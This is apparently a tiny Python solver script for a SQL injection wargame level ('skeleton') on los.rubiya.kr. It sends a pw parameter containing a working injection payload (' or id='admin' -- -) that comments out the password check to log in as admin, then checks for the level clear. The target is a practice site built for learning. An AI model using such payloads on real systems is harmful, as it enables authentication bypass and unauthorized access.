from constants import *

chall_url = "https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php"

res = make_request(chall_url, "?pw=" + urllib.parse.quote(f"' or id='admin' -- -"))
check_clear(res)
